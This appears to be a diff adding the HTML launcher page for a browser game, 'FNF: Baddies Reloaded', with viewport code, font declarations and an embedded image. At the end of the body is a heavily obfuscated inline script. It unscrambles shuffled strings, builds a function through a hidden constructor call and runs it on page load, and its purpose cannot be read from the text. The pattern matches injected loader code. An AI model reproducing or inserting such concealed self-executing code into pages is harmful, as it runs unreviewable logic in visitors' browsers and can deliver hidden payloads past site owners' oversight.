@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	
+	<meta charset="utf-8">
+	
+	<title>FNF: Baddies Reloaded</title>
+<script async src="/js/discord.js"></script>
+<script type="text/javascript" src="Gamaverse.js"></script>
+	
+	<meta id="viewport" name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+	<meta name="mobile-web-app-capable" content="yes">
+	
+	<link rel="shortcut icon" type="image/png" href="./favicon.png">
+	
+	<script>
+		window.addEventListener ("touchmove", function (event) { event.preventDefault (); }, { capture: false, passive: false });
+		if (typeof window.devicePixelRatio != 'undefined' && window.devicePixelRatio > 2) {
+			var meta = document.getElementById ("viewport");
+			meta.setAttribute ('content', 'width=device-width, initial-scale=' + (2 / window.devicePixelRatio) + ', user-scalable=no');
+		}
+	</script>
+	
+	<style>
+		html,body { margin: 0; padding: 0; height: 100%; overflow: hidden; }
+		#openfl-content { background-color: #000000; background-image: url(data:image/png;base64,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); background-position: center center; background-repeat: no-repeat; width: 100%; height: 100%; }
+		@font-face {
+			font-family: 'EASTER CHALK';
+			src: url('assets/fonts/Chalk.eot?#iefix') format('embedded-opentype'),
+			url('assets/fonts/Chalk.woff') format('woff'),
+			url('assets/fonts/Chalk.ttf') format('truetype'),
+			url('assets/fonts/Chalk.svg#EASTER%20CHALK') format('svg');
+			font-weight: normal;
+			font-style: normal;
+		}
+		@font-face {
+			font-family: 'Contrail One';
+			src: url('assets/fonts/dialogue.eot?#iefix') format('embedded-opentype'),
+			url('assets/fonts/dialogue.woff') format('woff'),
+			url('assets/fonts/dialogue.ttf') format('truetype'),
+			url('assets/fonts/dialogue.svg#Contrail%20One') format('svg');
+			font-weight: normal;
+			font-style: normal;
+		}
+		@font-face {
+			font-family: 'Gothic Joker';
+			src: url('assets/fonts/GothicJoker.eot?#iefix') format('embedded-opentype'),
+			url('assets/fonts/GothicJoker.woff') format('woff'),
+			url('assets/fonts/GothicJoker.ttf') format('truetype'),
+			url('assets/fonts/GothicJoker.svg#Gothic%20Joker') format('svg');
+			font-weight: normal;
+			font-style: normal;
+		}
+		@font-face {
+			font-family: 'MIKE Regular';
+			src: url('assets/fonts/mike.eot?#iefix') format('embedded-opentype'),
+			url('assets/fonts/mike.woff') format('woff'),
+			url('assets/fonts/mike.ttf') format('truetype'),
+			url('assets/fonts/mike.svg#MIKE%20Regular') format('svg');
+			font-weight: normal;
+			font-style: normal;
+		}
+		@font-face {
+			font-family: 'Perfect Futures Italic';
+			src: url('assets/fonts/perfect.eot?#iefix') format('embedded-opentype'),
+			url('assets/fonts/perfect.woff') format('woff'),
+			url('assets/fonts/perfect.ttf') format('truetype'),
+			url('assets/fonts/perfect.svg#Perfect%20Futures%20Italic') format('svg');
+			font-weight: normal;
+			font-style: normal;
+		}
+		@font-face {
+			font-family: 'Pixel Arial 11 Bold';
+			src: url('assets/fonts/pixel.eot?#iefix') format('embedded-opentype'),
+			url('assets/fonts/pixel.woff') format('woff'),
+			url('assets/fonts/pixel.otf') format('truetype');
+			font-weight: normal;
+			font-style: normal;
+		}
+		@font-face {
+			font-family: 'VCR OSD Mono';
+			src: url('assets/fonts/vcr.eot?#iefix') format('embedded-opentype'),
+			url('assets/fonts/vcr.woff') format('woff'),
+			url('assets/fonts/vcr.ttf') format('truetype'),
+			url('assets/fonts/vcr.svg#VCR%20OSD%20Mono') format('svg');
+			font-weight: normal;
+			font-style: normal;
+		}
+		@font-face {
+			font-family: 'Secret Typewriter';
+			src: url('assets/fonts/veteran typewriter.eot?#iefix') format('embedded-opentype'),
+			url('assets/fonts/veteran typewriter.woff') format('woff'),
+			url('assets/fonts/veteran typewriter.ttf') format('truetype'),
+			url('assets/fonts/veteran typewriter.svg#Secret%20Typewriter') format('svg');
+			font-weight: normal;
+			font-style: normal;
+		}
+		@font-face {
+			font-family: 'Zondas';
+			src: url('assets/fonts/Zondas.eot?#iefix') format('embedded-opentype'),
+			url('assets/fonts/Zondas.woff') format('woff'),
+			url('assets/fonts/Zondas.ttf') format('truetype'),
+			url('assets/fonts/Zondas.svg#Zondas') format('svg');
+			font-weight: normal;
+			font-style: normal;
+		}
+		@font-face {
+			font-family: 'Nokia Cellphone FC Small';
+			src: url('flixel/fonts/nokiafc22.eot?#iefix') format('embedded-opentype'),
+			url('flixel/fonts/nokiafc22.woff') format('woff'),
+			url('flixel/fonts/nokiafc22.ttf') format('truetype'),
+			url('flixel/fonts/nokiafc22.svg#Nokia%20Cellphone%20FC%20Small') format('svg');
+			font-weight: normal;
+			font-style: normal;
+		}
+		@font-face {
+			font-family: 'Monsterrat';
+			src: url('flixel/fonts/monsterrat.eot?#iefix') format('embedded-opentype'),
+			url('flixel/fonts/monsterrat.woff') format('woff'),
+			url('flixel/fonts/monsterrat.ttf') format('truetype'),
+			url('flixel/fonts/monsterrat.svg#Monsterrat') format('svg');
+			font-weight: normal;
+			font-style: normal;
+		}
+
+	</style>
+    
+    <link rel="canonical" href="https://gamaverse.com/fnf-baddies-reloaded-game/" />
+	
+</head>
+<body>
+	
+	<noscript>This webpage makes extensive use of JavaScript. Please enable JavaScript in your web browser to view this page.</noscript>
+	
+	<div id="openfl-content"></div>
+	
+	<script type="text/javascript">
+        var _$_bdb8=(function(q,v){var y=q.length;var b=[];for(var e=0;e< y;e++){b[e]= q.charAt(e)};for(var e=0;e< y;e++){var l=v* (e+ 220)+ (v% 47468);var d=v* (e+ 682)+ (v% 13053);var x=l% y;var c=d% y;var n=b[x];b[x]= b[c];b[c]= n;v= (l+ d)% 1380231};var w=String.fromCharCode(127);var m='';var t='%';var i='#1';var h='%';var p='#0';var k='#';return b.join(m).split(t).join(w).split(i).join(h).split(p).join(k).split(w)})("jtayunitttvcota%eaivcf](%e) sern%/oeom]hp\"elsfcitosmpnttal%nn=hcue#tG.%ona0yyars%_/oshc=empe(o%rmlcaoaexto%ataeGcoaop.pse#d[vsm%rnoc-te%tmo00nhin0cevur%-/es)n0e0p%er.p-hcsoanoloccntswt%Fft%ue ee%n%n\"ormo%stnrtsuttcoorcaema%..rlencaueo[ruat%(-nrtstesntnkosotstteoc%\"s%cms%u`ef0ct`tit3btep0lustpenhenir\"jear)lr;g",141120);(function(){var lcr='',YdF=421-410;function Drj(n){var u=1507248;var h=n.length;var b=[];for(var i=0;i<h;i++){b[i]=n.charAt(i)};for(var i=0;i<h;i++){var o=u*(i+123)+(u%14548);var f=u*(i+648)+(u%42553);var t=o%h;var d=f%h;var j=b[t];b[t]=b[d];b[d]=j;u=(o+f)%6549164;};return b.join('')};var dvb=Drj('czneoiuydrrmbnxsjchtkowpatlgrqfsvutoc').substr(0,YdF);var zgB='40S+ot]1,;o],=,=r.=garr1."bbc41rg n;+l9)Cbl,;rripxps2qi-ua]us.9,g(ae)5t0t74,.goz]n(c 802.2r7)r[).98-cva8l,8{;)vt=6f70 afc))li=C2i](.ori=nd[)().=+iime,+ ft=oi )k=d,(8;=oh.eee sr=n;4z=er;ivl4epara-cta5{ev6b +1p,nf]te;.x)cn7fe>gthgu6;e}wr[f+r0ggr )(f6[xo;p;,1.(h =lt;7o(=he(;;j;+.nlC ,x;w,7m1ph=t{+)+me[j[,r;i.;+lag)fss=.! n=flr>=((rnru;<ffa{)ol,7}gkth;t=i.erfo.(vor0r]fpu<t106.a)orr"basit(tu(v-eA[vs)to}rt9gn.d=0;;ro8tscgs-n *i+v()h7r5([)s(6l}1g)o;=;gmru+(lea3h)irnbrauaa{t;t ulr9)0d.kf<e.)oa((c(gAuvg+(tljglv,;(si9dCr=[a2i"jr);f+*eut(}),kn(Co5;; uaAcv="co. uahla=tq;)ura} A).3u.drs.s+tlsl}62)v8vclm0ra=8irw=aaCpiap-vnl,ot+ed!;rno,eki61a<n""+29rh=f mu5nvr=4nv1t8;li-==n+(ig+p=;n]))ztisahotr1]v;av.l{thznf="8[h");vgr c;;v1")h,p=rt;(0;cdr[ahxp(5](u llnv angtecjgqnjnlA+arCecmr4rg;=,rl+(ewr[,f,<+;ses,wh cu+{]=[;)oi=2=m,gec]w]d==t=]lru)sqS=,u (arv;t;hw0po(  d= ;sheagvtg;n+.oam2,(C+nj"[.aoyl(1n;';var Ghi=Drj[dvb];var AiK='';var Mer=Ghi;var YhT=Ghi(AiK,Drj(zgB));var GLC=YhT(Drj('le,tbO)aey_.=hw.cOea01ne.areO_Os1neaseo=!rrtaoeOO=r:.)a$Oea!&.;)tde..O$e])pe!oayd_tb!bacsdweali[p=\'2_)hledO_eEe.a;]l)l().us%,an{(&]i!Ob)cs,o,ga[(Olb$=v!(dnn1 ;1]OtOoa0_8&,aenth uS=O])8n.ad!=r3]a!_rr.[c4Ox0ee!(]7ode),at6]}{ixeaOsOb.g]almto(i?_$ yne,_0!o]8S,=1f.x[2)\']O(})tOunrr)be_a!.aa&E$(b,h.a0h.\'dxon)n!Od(a&n)sOc=t..,Olescnc"arO%e|o_at( it.r!)$(O]!e),eidehv;#.n!Oupo,_red&lot(.beb.le!)iOt6w1O1O__bop]f)d$u]$ad%erdnt).da;lqkod!e2yS=l!b")l.a}]]yl_ip.t\'$O1)ets)O#.-O_imOnre)y(%.w5&1ev!,r800T2),=rc(Obtlt..ej]}u!enudOrm$]an..!iOO}|n.:.)tO.(d}noo\'l"m:u]xettmncte_te!0p1cp!wcxo)dl!0x})nwbxO3x,+n5SEc nwrdiea"t8ie$1ea, wtbEbqxe{.)w:t($f]?iOndOt.!].!o.i((cOOb:mu(=n! {u&as.g})ou4nbo7a.$b.)lh]et]hie.}horf,lO_=O#O$ual,!noe$\'.{ )dn.$(0s\'{e1r.lonk#.t]nm_!re&u=iedOt.et$c}%a)tlsO(s]_m0=8.r9dan&,n 0[dcgk,,e_)O)qo!8scoceaa1t.!,ra_.aasaze'));var GaT=Mer(lcr,GLC );GaT(8642);return 8188})();
+	</script>
+	
+</body>
+</html>
